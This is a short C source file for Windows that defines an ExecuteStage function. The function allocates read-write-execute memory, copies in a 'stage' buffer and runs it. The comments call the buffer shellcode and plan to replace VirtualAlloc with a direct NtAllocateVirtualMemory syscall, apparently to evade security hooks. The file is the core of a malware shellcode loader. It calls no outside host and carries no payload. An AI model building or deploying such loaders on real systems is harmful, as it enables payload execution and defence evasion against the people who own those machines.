#include <stdio.h>
#include <windows.h>

#include "syscalls.h"

VOID ExecuteStage(CHAR* Stage, DWORD sSize)
{
    // execute the shellcode

    // replace this with a syscall NtAllocateVirtualMemory
    void* module = VirtualAlloc(0, sSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(module, Stage, sSize);
    ((void(*)())module)();

    return;
}